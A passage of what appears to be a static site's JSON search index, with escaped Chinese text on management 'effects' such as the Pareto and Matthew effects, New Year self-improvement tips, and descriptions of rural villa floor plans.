<p>\u8b6c\u5982\u5728\u80a1\u5e02\u4e2d\uff0c\u9cc4\u9c7c\u6cd5\u5219\u5c31\u662f\uff1a\u5f53\u4f60\u53d1\u73b0\u81ea\u5df1\u7684\u4ea4\u6613\u80cc\u79bb\u4e86\u5e02\u573a\u7684\u65b9\u5411\uff0c\u5fc5\u987b\u7acb\u5373\u6b62\u635f\uff0c\u4e0d\u5f97\u6709\u4efb\u4f55\u5ef6\u8bef\uff0c\u4e0d\u5f97\u5b58\u6709\u4efb\u4f55\u4fa5\u5e78\u3002</p>"},{"location":"note/01-effect/#_13","title":"\u9c87\u9c7c\u6548\u5e94","text":"<p>\u4ee5\u524d\uff0c\u6c99\u4e01\u9c7c\u5728\u8fd0\u8f93\u8fc7\u7a0b\u4e2d\u6210\u6d3b\u7387\u5f88\u4f4e\u3002\u540e\u6709\u4eba\u53d1\u73b0\uff0c\u82e5\u5728\u6c99\u4e01\u9c7c\u4e2d\u653e\u4e00\u6761\u9c87\u9c7c\uff0c\u60c5\u51b5\u5374\u6709\u6240\u6539\u89c2\uff0c\u6210\u6d3b\u7387\u4f1a\u5927\u5927\u63d0\u9ad8\u3002\u8fd9\u662f\u4f55\u6545\u5462?</p> <p>\u539f\u6765\u9c87\u9c7c\u5728\u5230\u4e86\u4e00\u4e2a\u964c\u751f\u7684\u73af\u5883\u540e\uff0c\u5c31\u4f1a\u201c\u6027\u60c5\u6025\u8e81\u201d\uff0c\u56db\u5904\u4e71\u6e38\uff0c\u8fd9\u5bf9\u4e8e\u5927\u91cf\u597d\u9759\u7684\u6c99\u4e01\u9c7c\u6765\u8bf4\uff0c\u65e0\u7591\u8d77\u5230\u4e86\u6405\u62cc\u4f5c\u7528;\u800c\u6c99\u4e01\u9c7c\u53d1\u73b0\u591a\u4e86\u8fd9\u6837\u4e00\u4e2a\u201c\u5f02\u5df2\u5206\u5b50\u201d\uff0c\u81ea\u7136\u4e5f\u5f88\u7d27\u5f20\uff0c\u52a0\u901f\u6e38\u52a8\u3002\u8fd9\u6837\u6c99\u4e01\u9c7c\u7f3a\u6c27\u7684\u95ee\u9898\u5c31\u8fce\u5203\u800c\u89e3\u4e86\uff0c\u6c99\u4e01\u9c7c\u4e5f\u5c31\u4e0d\u4f1a\u6b7b\u4e86\u3002</p>"},{"location":"note/01-effect/#_14","title":"\u7f8a\u7fa4\u6548\u5e94","text":"<p>\u5934\u7f8a\u5f80\u54ea\u91cc\u8d70\uff0c\u540e\u9762\u7684\u7f8a\u5c31\u8ddf\u7740\u5f80\u54ea\u91cc\u8d70\u3002</p> <p>\u7f8a\u7fa4\u6548\u5e94\u6700\u65e9\u662f\u80a1\u7968\u6295\u8d44\u4e2d\u7684\u4e00\u4e2a\u672f\u8bed\uff0c\u4e3b\u8981\u662f\u6307\u6295\u8d44\u8005\u5728\u4ea4\u6613\u8fc7\u7a0b\u4e2d\u5b58\u5728\u5b66\u4e60\u4e0e\u6a21\u4eff\u73b0\u8c61\uff0c\u201c\u6709\u6837\u5b66\u6837\u201d\uff0c\u76f2\u76ee\u6548\u4eff\u522b\u4eba\uff0c\u4ece\u800c\u5bfc\u81f4\u4ed6\u4eec\u5728\u67d0\u6bb5\u65f6\u671f\u5185\u4e70\u5356\u76f8\u540c\u7684\u80a1\u7968\u3002</p>"},{"location":"note/01-effect/#_15","title":"\u523a\u732c\u6cd5\u5219","text":"<p>\u4e24\u53ea\u56f0\u5026\u7684\u523a\u732c\uff0c\u7531\u4e8e\u5bd2\u51b7\u800c\u62e5\u5728\u4e00\u8d77\u3002\u53ef\u56e0\u4e3a\u5404\u81ea\u8eab\u4e0a\u90fd\u957f\u7740\u523a\uff0c\u4e8e\u662f\u5b83\u4eec\u79bb\u5f00\u4e86\u4e00\u6bb5\u8ddd\u79bb\uff0c\u4f46\u53c8\u51b7\u5f97\u53d7\u4e0d\u4e86\uff0c\u4e8e\u662f\u51d1\u5230\u4e00\u8d77\u3002\u51e0\u7ecf\u6298\u817e\uff0c\u4e24\u53ea\u523a\u732c\u7ec8\u4e8e\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684\u8ddd\u79bb\uff1a\u65e2\u80fd\u4e92\u76f8\u83b7\u5f97\u5bf9\u65b9\u7684\u6e29\u6696\u800c\u53c8\u4e0d\u81f3\u4e8e\u88ab\u624e\u3002</p> <p>\u523a\u732c\u6cd5\u5219\u4e3b\u8981\u662f\u6307\u4eba\u9645\u4ea4\u5f80\u4e2d\u7684\u201c\u5fc3\u7406\u8ddd\u79bb\u6548\u5e94\u201d\u3002</p>"},{"location":"note/01-effect/#_16","title":"\u624b\u8868\u5b9a\u5f8b","text":"<p>\u624b\u8868\u5b9a\u5f8b\u662f\u6307\u4e00\u4e2a\u4eba\u6709\u4e00\u53ea\u8868\u65f6\uff0c\u53ef\u4ee5\u77e5\u9053\u73b0\u5728\u662f\u51e0\u70b9\u949f\uff0c\u800c\u5f53\u4ed6\u540c\u65f6\u62e5\u6709\u4e24\u53ea\u65f6\u5374\u65e0\u6cd5\u786e\u5b9a\u3002\u4e24\u53ea\u8868\u5e76\u4e0d\u80fd\u544a\u8bc9\u4e00\u4e2a\u4eba\u66f4\u51c6\u786e\u7684\u65f6\u95f4\uff0c\u53cd\u800c\u4f1a\u4f7f\u770b\u8868\u7684\u4eba\u5931\u53bb\u5bf9\u51c6\u786e\u65f6\u95f4\u7684\u4fe1\u5fc3\u3002</p> <p>\u624b\u8868\u5b9a\u5f8b\u5728\u4f01\u4e1a\u7ba1\u7406\u65b9\u9762\u7ed9\u6211\u4eec\u4e00\u79cd\u975e\u5e38\u76f4\u89c2\u7684\u542f\u53d1\uff0c\u5c31\u662f\u5bf9\u540c\u4e00\u4e2a\u4eba\u6216\u540c\u4e00\u4e2a\u7ec4\u7ec7\u4e0d\u80fd\u540c\u65f6\u91c7\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\uff0c\u4e0d\u80fd\u540c\u65f6\u8bbe\u7f6e\u4e24\u4e2a\u4e0d\u540c\u7684\u76ee\u6807\uff0c\u751a\u81f3\u6bcf\u4e00\u4e2a\u4eba\u4e0d\u80fd\u7531\u4e24\u4e2a\u4eba\u6765\u540c\u65f6\u6307\u6325\uff0c\u5426\u5219\u5c06\u4f7f\u8fd9\u4e2a\u4f01\u4e1a\u6216\u8005\u4e2a\u4eba\u65e0\u6240\u9002\u4ece\u3002</p>"},{"location":"note/01-effect/#_17","title":"\u4e8c\u516b\u5b9a\u5f8b(\u5df4\u83b1\u591a\u5b9a\u5f8b)","text":"<p>19\u4e16\u7eaa\u672b20\u4e16\u7eaa\u521d\u610f\u5927\u5229\u7684\u7ecf\u6d4e\u5b66\u5bb6\u5df4\u83b1\u591a\u8ba4\u4e3a\uff0c\u5728\u4efb\u4f55\u4e00\u7ec4\u4e1c\u897f\u4e2d\uff0c\u6700\u91cd\u8981\u7684\u53ea\u5360\u5176\u4e2d\u4e00\u5c0f\u90e8\u5206\uff0c\u7ea620%\uff0c\u5176\u4f5980%\u5c3d\u7ba1\u662f\u591a\u6570\uff0c\u5374\u662f\u6b21\u8981\u7684\u3002\u793e\u4f1a\u7ea680%\u7684\u8d22\u5bcc\u96c6\u4e2d\u572820%\u7684\u4eba\u624b\u91cc\uff0c\u800c80%\u7684\u4eba\u53ea\u62e5\u670920%\u7684\u793e\u4f1a\u8d22\u5bcc\u3002\u8fd9\u79cd\u7edf\u8ba1\u7684\u4e0d\u5e73\u8861\u6027\u5728\u793e\u4f1a\u3001\u7ecf\u6d4e\u53ca\u751f\u6d3b\u4e2d\u65e0\u5904\u4e0d\u5728\uff0c\u8fd9\u5c31\u662f\u4e8c\u516b\u6cd5\u5219\u3002</p> <p>\u4e8c\u516b\u6cd5\u5219\u544a\u8bc9\u6211\u4eec\uff0c\u4e0d\u8981\u5e73\u5747\u5730\u5206\u6790\u3001\u5904\u7406\u548c\u770b\u5f85\u95ee\u9898\uff0c\u4f01\u4e1a\u7ecf\u8425\u548c\u7ba1\u7406\u4e2d\u8981\u6293\u4f4f\u5173\u952e\u7684\u5c11\u6570;\u8981\u627e\u51fa\u90a3\u4e9b\u80fd\u7ed9\u4f01\u4e1a\u5e26\u676580%\u5229\u6da6\u3001\u603b\u91cf\u5374\u4ec5\u536020%\u7684\u5173\u952e\u5ba2\u6237\uff0c\u52a0\u5f3a\u670d\u52a1\uff0c\u8fbe\u5230\u4e8b\u534a\u529f\u500d\u7684\u6548\u679c;\u4f01\u4e1a\u9886\u5bfc\u4eba\u8981\u5bf9\u5de5\u4f5c\u8ba4\u771f\u5206\u7c7b\u5206\u6790\uff0c\u8981\u628a\u4e3b\u8981\u7cbe\u529b\u82b1\u5728\u89e3\u51b3\u4e3b\u8981\u95ee\u9898\u3001\u6293\u4e3b\u8981\u9879\u76ee\u4e0a\u3002</p>"},{"location":"note/01-effect/#_18","title":"\u6728\u6876\u7406\u8bba","text":"<p>\u7ec4\u6210\u6728\u6876\u7684\u6728\u677f\u5982\u679c\u957f\u77ed\u4e0d\u9f50\uff0c\u90a3\u4e48\u6728\u6876\u7684\u76db\u6c34\u91cf\u4e0d\u662f\u53d6\u51b3\u4e8e\u6700\u957f\u7684\u90a3\u4e00\u5757\u6728\u677f\uff0c\u800c\u662f\u53d6\u51b3\u4e8e\u6700\u77ed\u7684\u90a3\u4e00\u5757\u6728\u677f\u3002</p>"},{"location":"note/01-effect/#_19","title":"\u9a6c\u592a\u6548\u5e94","text":"<p>\u300a\u5723\u7ecf\u00b7\u9a6c\u592a\u798f\u97f3\u300b\u4e2d\u6709\u4e00\u53e5\u540d\u8a00\uff1a\u201c\u51e1\u6709\u7684\uff0c\u8fd8\u8981\u52a0\u7ed9\u4ed6\uff0c\u53eb\u4ed6\u6709\u4f59;\u6ca1\u6709\u7684\uff0c\u8fde\u4ed6\u6240\u6709\u7684\uff0c\u4e5f\u8981\u593a\u8fc7\u6765\u3002\u201d</p> <p>\u793e\u4f1a\u5b66\u5bb6\u4ece\u4e2d\u5f15\u7533\u51fa\u4e86\u201c\u9a6c\u592a\u6548\u5e94\u201d\u8fd9\u4e00\u6982\u5ff5\uff0c\u7528\u4ee5\u63cf\u8ff0\u793e\u4f1a\u751f\u6d3b\u9886\u57df\u4e2d\u666e\u904d\u5b58\u5728\u7684\u4e24\u6781\u5206\u5316\u73b0\u8c61\u3002</p>"},{"location":"note/02-start/","title":"\u65b0\u5e74\u5bc4\u8bed","text":""},{"location":"note/02-start/#_2","title":"\u4e00\u3001\u8c03\u6574\u81ea\u5f8b\u7684\u751f\u6d3b\u4e60\u60ef","text":"<ul> <li>\u4fdd\u8bc1\u5145\u8db3\u7761\u7720\uff088\u5c0f\u65f6\uff09\u6212\u9664\u71ac\u591c</li> <li>\u4e0d\u8d56\u5e8a\uff0c\u7741\u773c\u7acb\u523b\u79bb\u5f00\u5e8a\u53bb\u6d17\u6f31</li> <li>\u6bcf\u5929\u81f3\u5c116\u676f\u6c34\u662f\u517b\u751f\u6700\u597d\u7684\u65b9\u5f0f</li> <li>\u5403\u996d\u53ea\u5403\u516b\u5206\u9971\uff08\u6709\u5229\u4e8e\u8eab\u4f53\u5065\u5eb7\uff09</li> <li>\u6bcf\u5929 \u591a\u5403\u852c\u83dc\u548c\u6c34\u679c\u6444\u53d6\u7ef4C</li> <li>\u6212\u7cd6\u3001\u5976\u8336\u78b3\u9178\u996e\u6599\u5c11\u5403\u6cb9\u70b8</li> <li>\u575a\u6301\u6bcf\u5929\u8fd0\u52a8\uff08\u6548\u7387\u9ad8\u8111\u5b50\u5feb\uff09</li> <li>\u65e9\u9910\u4e00\u5b9a\u8981\u5403\u4e00\u5929\u7cbe\u529b\u6e90\u6cc9</li> <li>\u575a\u6301\u8bb0\u8d26\uff0c\u575a\u6301\u6d88\u8d39\u964d\u7ea7</li> <li>\u4e0d\u7fd8\u4e8c\u90de\u817f</li> </ul>"},{"location":"note/02-start/#_3","title":"\u4e8c\u3001\u63d0\u5347\u81ea\u5df1\u7684\u4f53\u6001\u6c14\u8d28","text":"<ul> <li>\u591a\u5fae\u7b11\uff0c\u5fae\u7b11\u80fd\u5e26\u6765\u81ea\u4fe1\u548c\u8fd0\u6c14</li> <li>\u65f6\u523b\u63d0\u9192\u8d70\u8def\u62ac\u5934\u3001\u633a\u80f8\u3001\u4e0d\u9a7c\u80cc</li> <li>\u591a\u9605\u8bfb\uff0c\u63d0\u5347\u81ea\u5df1\u773c\u754c\u548c\u8ba4\u77e5</li> <li>\u4fdd\u6301\u4f4e\u8c03\u6c89\u7a33\uff0c\u4e0d\u8fc7\u591a\u66b4\u9732\u81ea\u5df1</li> <li>\u6574\u7406\u81ea\u5df1\u5916\u5728\uff0c\u5e72\u51c0\u6e05\u723d\u7cbe\u795e</li> <li>\u7a7f\u7740\u5e72\u51c0\u7b80\u6d01\u5927\u65b9\u3001\u591a\u63d0\u5347\u8863\u54c1</li> <li>\u591a\u7ec3\u4e60\u666e\u901a\u8bdd\u53d1\u97f3</li> <li>\u4e0d\u541d\u556c\u5bf9\u522b\u4eba\u7684\u5938\u5956\uff0c\u5927\u65b9\u6b23\u8d4f</li> <li>\u4e0d\u8981\u603b\u53f9\u6c14\uff0c\u544a\u522b\u8d1f\u80fd\u91cf\u548c\u62b1\u6028</li> </ul>"},{"location":"note/02-start/#_4","title":"\u4e09\u3001\u591a\u7ef4\u5ea6\u63d0\u5347\u81ea\u8eab\u80fd\u529b","text":"<ul> <li>\u4e89\u53d6\u6bcf\u5468\u770b\u4e00\u672c\u4e66</li> <li>\u4e70\u4e2a\u5b57\u8d34\u7ec3\u4e00\u624b\u597d\u5b57</li> <li>\u63d0\u5347\u81ea\u5df1\u7684\u8868\u8fbe\u80fd\u529b\u548c\u601d\u7ef4\u80fd\u529b</li> <li>\u591a\u5bf9\u955c\u7ec3\u4e60\uff0c\u953b\u70bc\u81ea\u5df1\u7684\u8868\u8fbe\u80fd\u529b</li> <li>\u788e\u7247\u5316\u5b66\u4e60\uff0c\u542c\u4e66\u3001\u770bTED\u7b49</li> <li>\u63d0\u9ad8\u81ea\u5df1\u7684\u6267\u884c\u529b\u3001\u4e13\u6ce8\u529b</li> <li>\u63d0\u5347\u81ea\u5df1\u7684\u81ea\u4fe1\uff0c\u81ea\u4fe1\u653e\u5149\u8292</li> <li>\u63d0\u5347\u6548\u7387\uff0c\u627e\u7b26\u5408\u81ea\u5df1\u7684\u65b9\u5f0f\u65b9\u6cd5</li> <li>\u6212\u6389\u62d6\u5ef6\u75c7\uff0c\u8981\u505a\u7684\u4e8b\u60c5\u7acb\u523b\u884c\u52a8</li> <li>\u6bcf\u5929\u5199\u70b9\u4ec0\u4e48\uff0c\u63d0\u5347\u5199\u4f5c\u80fd\u529b</li> <li>\u7cbe\u8fdb\u5b66\u4e60\uff0c\u5de5\u4f5c\u6240\u9700\u7684\u6280\u80fd</li> </ul>"},{"location":"note/02-start/#_5","title":"\u56db\u3001\u5173\u4e8e\u4eba\u9645\u4ea4\u5f80\u7684\u5efa\u8bae","text":"<ul> <li>\u7b54\u5e94\u65f6\u723d\u5feb\uff0c\u62d2\u7edd\u65f6\u9700\u679c\u65ad</li> <li>\u522b\u8f7b\u6613\u501f\u94b1\uff0c\u4e5f\u522b\u8f7b\u6613\u501f\u94b1\u7ed9\u522b\u4eba</li> <li>\u4e0d\u8981\u603b\u5411\u4ed6\u4eba\u62b1\u6028\u81ea\u5df1\u7684\u4e8b\u60c5</li> <li>\u63d0\u9ad8\u5708\u5b50\u8d28\u91cf\uff0c\u591a\u548c\u4f18\u79c0\u7684\u4eba\u63a5\u89e6</li> <li>\u4e0d\u8981\u8f7b\u6613\u5426\u5b9a\u522b\u4eba\u7684\u52aa\u529b\u548c\u68a6\u60f3</li> <li>\u65f6\u523b\u8c28\u8bb0\uff0c\u5c0a\u91cd\u662f\u76f8\u4e92\u7684</li> <li>\u6ce8\u610f\u4e2a\u4eba\u5f62\u8c61\uff0c\u8863\u7740\uff0c\u8981\u5e72\u51c0\u6574\u6d01</li> <li>\u4e0d\u968f\u610f\u6253\u65ad\u4ed6\u4eba\u7684\u8c08\u8bdd</li> <li>\u7f51\u4e0a\u53ef\u5403\u74dc\uff0c\u73b0\u5b9e\u4e2d\u4e0d\u8981\u516b\u5366</li> <li>\u5927\u5927\u65b9\u65b9\u5730\u627f\u8ba4\u522b\u4eba\u7684\u4f18\u79c0</li> </ul>"},{"location":"note/02-start/#_6","title":"\u4e94\u3001\u8ba9\u81ea\u5df1\u53d8\u5f97\u4f18\u79c0","text":"<ul> <li>\u80fd\u529b\u8303\u56f4\u5185\uff0c\u5584\u4e8e\u5e2e\u52a9\u522b\u4eba</li> <li>\u901a\u60c5\u8fbe\u7406\uff0c\u4e0d\u80e1\u4e71\u65e0\u7406\u53d6\u95f9</li> <li>\u6362\u4f4d\u601d\u8003\uff0c\u7ad9\u5728\u5bf9\u65b9\u89d2\u5ea6\u770b\u95ee\u9898</li> <li>\u5fcd\u7740\u51b2\u52a8\uff0c\u4e0d\u8981\u8bf4\u51fa\u5f88\u4f24\u4eba\u7684\u8bdd</li> <li>\u5f00\u53e3\u524d\uff0c\u5148\u75283\u79d2\u65f6\u95f4\u5728\u5927\u8111\u5148\u7ec4\u7ec7\u8bed\u8a00</li> <li>\u63d0\u5347\u60c5\u5546\uff0c\u5b66\u70b9\u4e3a\u4eba\u5904\u4e8b\u4e4b\u9053</li> </ul>"},{"location":"note/02-start/#_7","title":"\u516d\u3001\u517b\u6210\u826f\u597d\u6d88\u8d39\u89c2","text":"<ul> <li>\u7406\u6027\u5f00\u9500\uff0c\u4e0d\u76f2\u76ee\u4e0d\u8ddf\u98ce</li> <li>\u517b\u6210\u8bb0\u8d26\u7684\u597d\u4e60\u60ef\uff0c\u4fbf\u4e8e\u6bcf\u6708\u590d\u76d8</li> <li>\u61c2\u5f97\u5f00\u59cb\u7ed9\u81ea\u5df1\u5b58\u6b3e\uff0c\u8bbe\u7acb\u76ee\u6807</li> <li>\u5b66\u4e60\u7406\u8d22\u77e5\u8bc6\uff0c\u770b\u4e66\u3001\u7eaa\u5f55\u7247</li> <li>\u4e1a\u4f59\u65f6\u95f4\u7ed9\u81ea\u5df1\u589e\u52a0\u5176\u4ed6\u6536\u5165\u6e20\u9053</li> </ul>"},{"location":"note/84-villa-00-01/","title":"\u522b\u5885\u301000-01\u3011","text":"<p>**\u56fe\u7eb8\u4ecb\u7ecd\uff1a**\u519c\u675117\u4e07\u5143\u4e00\u5c42\u81ea\u5efa\u522b\u5885\u8bbe\u8ba1\u56fe\uff0c\u5916\u89c2\u7b80\u6d01\uff0c\u6237\u578b\u65b9\u6b63\uff0c\u5916\u5899\u91c7\u7528\u6bd4\u8f83\u8010\u770b\u7684\u660e\u9ec4\u8272\u88c5\u9970\uff0c\u5c4b\u9876\u5761\u9762\u8bbe\u8ba1\uff0c\u91c7\u7528\u7ea2\u8272\u7816\u74e6\uff0c\u5ba4\u5185\u5171\u8bbe\u67094\u95f4\u5367\u5ba4\uff0c\u5404\u7a7a\u95f4\u5e03\u5c40\u5bbd\u655e\u660e\u4eae\uff0c\u4f4f\u5728\u91cc\u9762\u80fd\u8ba9\u4eba\u5fc3\u60c5\u8212\u9002</p> <p>**\u5360\u5730\u9762\u79ef\uff1a**13.7m*13.5m\uff0c163\u5e73\u65b9\u7c73\u5de6\u53f3\uff1b</p> <p>**\u5efa\u7b51\u5c42\u9ad8\uff1a**\u4e00\u5c42\uff1b</p> <p>**\u5efa\u7b51\u9ad8\u5ea6\uff1a**6.8\u7c73\uff08\u542b\u5c4b\u9876\uff09\uff1b</p> <p>\u8bbe\u8ba1\u529f\u80fd\uff1a</p> <p>\u4e00\u5c42\u6237\u578b\uff1a\u5ba2\u5385\u3001\u9910\u5385\u3001\u53a8\u623f\u3001\u5367\u5ba4x3\u3001\u5367\u5ba4\uff08\u5e26\u536b\u751f\u95f4\uff09\u3001\u536b\u751f\u95f4\uff1b</p> <p>\u56fe\u7eb8\u76ee\u5f55\uff1a</p> <p>\u5efa \u7b51 \u56fe\uff1a\u5efa\u7b51\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u5e73\u9762\u56fe\u3001\u6b63\u7acb\u9762\u56fe\u3001\u80cc\u7acb\u9762\u56fe\u3001\u5de6\u7acb\u9762\u56fe\u3001\u53f3\u7acb\u9762\u56fe\u30011-1\u5256\u9762\u56fe\u3001\u697c\u68af\u5927\u6837\u56fe\u3001\u95e8\u6597\u5927\u6837\u56fe\u3001\u8282\u70b9\u5927\u6837\u56fe\u3001\u95e8\u7a97\u8be6\u56fe\u3001\u95e8\u7a97\u8868\u7b49\uff1b</p> <p>\u7ed3 \u6784 \u56fe\uff1a\u7ed3\u6784\u8bbe\u8ba1\u8bf4\u660e\u3001\u57fa\u7840\u5e73\u9762\u5e03\u7f6e\u56fe\u3001\u57fa\u7840\u5927\u6837\u56fe\u3001\u4e00\u5c42\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u3001\u5c4b\u9876\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u677f\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9762\u677f\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u697c\u68af\u5927\u6837\u56fe\u3001\u8282\u70b9\u5927\u6837\u56fe\u7b49\uff1b</p> <p>\u7ed9\u6392\u6c34\u56fe\uff1a\u7ed9\u6392\u6c34\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u536b\u751f\u95f4\u5927\u6837\u56fe\u3001\u7ed9\u6392\u6c34\u7cfb\u7edf\u56fe\u7b49\uff1b</p> <p>\u7535 \u6c14 \u56fe\uff1a\u7535\u6c14\u8bbe\u8ba1\u8bf4\u660e\u3001\u914d\u7535\u7cfb\u7edf\u56fe\u3001\u5f31\u7535\u7cfb\u7edf\u56fe\u3001\u914d\u7535\u5e72\u7ebf\u7cfb\u7edf\u56fe\u3001\u4e00\u5c42\u7167\u660e\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u63d2\u5ea7\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u5f31\u7535\u5e73\u9762\u56fe\u3001\u63a5\u5730\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u9632\u96f7\u5e73\u9762\u56fe\u7b49\uff1b</p> <p> </p>"},{"location":"note/84-villa-00-02/","title":"\u522b\u5885\u301000-02\u3011","text":"<p>\u56fe\u7eb8\u4ecb\u7ecd\uff1a\u672c\u6237\u578b\u4e3a\u6f02\u4eae\u3001\u7f8e\u89c2\u7684\u4e00\u5c42\u5e73\u623f\u8bbe\u8ba1\u56fe\uff0c\u542b\u5916\u89c2\u56fe\u7247\uff0c\u5185\u90e8\u5e03\u5c40\u975e\u5e38\u5408\u7406\uff0c\u5357\u5317\u901a\u900f\uff0c\u91c7\u5149\u4f18\u826f\uff0c4\u5ba4\u4e24\u5385\u4e24\u536b\u3002</p> <p>\u5360\u5730\u9762\u79ef\uff1a14.0m*10.5m\uff0c\u5efa\u7b51\u9762\u79ef145\u5e73\u5de6\u53f3\uff1b</p> <p>\u5efa\u7b51\u5c42\u9ad8\uff1a\u4e00\u5c42\uff1b</p> <p>\u5efa\u7b51\u9ad8\u5ea6\uff1a6.50\u7c73\uff08\u542b\u5c4b\u9876\uff09\uff1b</p> <p>\u8bbe\u8ba1\u529f\u80fd\uff1a</p> <p>\u4e00\u5c42\u6237\u578b\u8bbe\u8ba1\uff1a\u5ba2\u5385\u3001\u9910\u5385\u3001\u53a8\u623f\u3001\u4e3b\u5367\uff08\u5e26\u536b\u751f\u95f4\uff09\u3001\u5367\u5ba4x2\u3001\u4e66\u623f\u3001\u536b\u751f\u95f4\uff1b</p> <p>\u56fe\u7eb8\u76ee\u5f55\uff1a</p> <p>\u5efa\u7b51\u56fe\uff1a\u56fe\u7eb8\u76ee\u5f55\u3001\u5efa\u7b51\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u5e73\u9762\u56fe\u3001\u7acb\u9762\u56fex4\u3001\u5256\u9762\u56fe\u3001\u8282\u70b9\u5927\u6837\u56fe\u3001\u95e8\u5934\u5927\u6837\u56fe\u3001\u697c\u68af\u5927\u6837\u56fe\u3001\u95e8\u7a97\u8868\u7b49\uff1b</p> <p>\u7ed3\u6784\u56fe\uff1a\u56fe\u7eb8\u76ee\u5f55\u3001\u7ed3\u6784\u8bbe\u8ba1\u8bf4\u660e\u3001\u57fa\u7840\u5e73\u9762\u5e03\u7f6e\u56fe\u3001\u57fa\u7840\u5927\u6837\u56fe\u3001\u57fa\u7840\u6881\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u7ed3\u6784\u5e73\u9762\u56fe\u7b49\uff1b</p> <p>\u7ed9\u6392\u6c34\u56fe\uff1a\u56fe\u7eb8\u76ee\u5f55\u3001\u7ed9\u6392\u6c34\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u7ed9\u6392\u6c34\u7cfb\u7edf\u56fe\u7b49\uff1b</p> <p>\u7535\u6c14\u56fe\uff1a\u56fe\u7eb8\u76ee\u5f55\u3001\u7535\u6c14\u8bbe\u8ba1\u8bf4\u660e\u3001\u914d\u7535\u7cfb\u7edf\u56fe\u3001\u4e00\u5c42\u7167\u660e\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u63d2\u5ea7\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u5f31\u7535\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u9632\u96f7\u5e73\u9762\u56fe\u7b49\u3002</p> <p> </p>"},{"location":"note/84-villa-00-70/","title":"\u522b\u5885\u301000-70\u3011","text":""},{"location":"note/84-villa-00-70/#_1","title":"\u5b9e\u666f\u56fe","text":""},{"location":"note/84-villa-00-70/#_2","title":"\u65b9\u6848\u4e00","text":""},{"location":"note/84-villa-00-70/#_3","title":"\u65b9\u6848\u4e8c","text":""},{"location":"note/84-villa-00-70/#_4","title":"\u65b9\u6848\u4e09","text":""},{"location":"note/84-villa-00-70/#_5","title":"\u65b9\u6848\u56db","text":""},{"location":"note/84-villa-00-70/#_6","title":"\u8865\u5145","text":"<p>\u503e\u5411\u65b9\u6848\u4e00\u548c\u65b9\u6848\u56db\uff0c\u70b9\u51fb\u66f4\u591a</p> <p>\u540c\u7c7b\u578b\u53c2\u8003\u4e00</p> <p>\u540c\u7c7b\u578b\u53c2\u8003\u4e8c</p> <p>\u540c\u7c7b\u578b\u53c2\u8003\u4e09</p>"},{"location":"note/84-villa-34-80/","title":"\u522b\u5885\u301034-80\u3011","text":"<p>\u5efa\u7b51\u7269\u5360\u5730\u9762\u79ef\uff1a150.95\u5e73\u65b9\u7c73\uff0c\u5efa\u7b51\u9762\u79ef\uff1a279.93\u5e73\u65b9\u7c73\uff1b\u5efa\u7b51\u5c42\u6570\uff1a\u4e8c\u5c42</p> <p>\u6846\u67b6\u7ed3\u6784</p> <p>\u672c\u5957\u522b\u5885\u8bbe\u8ba1\u8d44\u6599\u6548\u679c\u56fe\u4e3aJPG\u683c\u5f0f\uff0c\u65bd\u5de5\u56fe\u4e3aDWG\u683c\u5f0f\uff0c\u5747\u53ef\u7528A3\u6216\u8005A2\u7eb8\u5f20\u6253\u5370\u51fa\u56fe\uff01</p> <p>\u95e8\u9762\u5bbd14.34\u7c73*\u8fdb\u6df111.34\u7c73</p> <p>\u6237\u578b\u4e3a\u5355\u5bb6\u72ec\u9662\u5f0f\uff0c\u5360\u5730\u9762\u79ef150.95\u5e73\u65b9\u7c73\uff0c\u5c45\u4f4f\u5efa\u7b51\u9762\u79ef279.93\u5e73\u65b9\u7c73\uff0c\u6846\u67b6\u7ed3\u6784\u3002\u4e00\u5c42\u8bbe\u6709\u95e8\u5385\u3001\u5ba2\u5385\u3001\u5367\u5ba42\u95f4\u3001\u536b\u751f\u95f4\u3001\u8f66\u5e93\u3001\u53a8\u623f\u3001\u9910\u5385\uff1b\u4e8c\u5c42\u8bbe\u6709\u4e3b\u5367\u5ba4\u5e26\u8863\u5e3d\u95f4\u3001\u536b\u751f\u95f4\u3001\u9732\u53f0\uff0c\u5367\u5ba42\u95f4,\u536b\u751f\u95f4\u3001\u6d3b\u52a8\u5ba4\u5e26\u9732\u53f0\u3001\u4e66\u623f\u3002</p> <p>\u672c\u6237\u578b\u91c7\u7528\u5761\u5c4b\u9876\uff0c\u5916\u89c2\u9020\u578b\u7b80\u6d01\u5927\u65b9\uff0c\u8272\u5f69\u660e\u5feb\uff0c\u623f\u95f4\u5c3a\u5ea6\u8bbe\u8ba1\u9002\u5b9c\uff0c\u7a7a\u95f4\u5229\u7528\u7387\u9ad8\uff0c\u5bcc\u6709\u65f6\u4ee3\u6c14\u606f\u3002</p> <p>\u5f00\u95f4\uff1a14.34\u7c73\uff0c\u8fdb\u6df1\uff1a11.34\u7c73\uff0c\u5360\u5730\u9762\u79ef\uff1a150.95\u5e73\u65b9\u7c73\uff0c\u5efa\u7b51\u9762\u79ef\uff1a279.93\u5e73\u65b9\u7c73\uff1b</p> 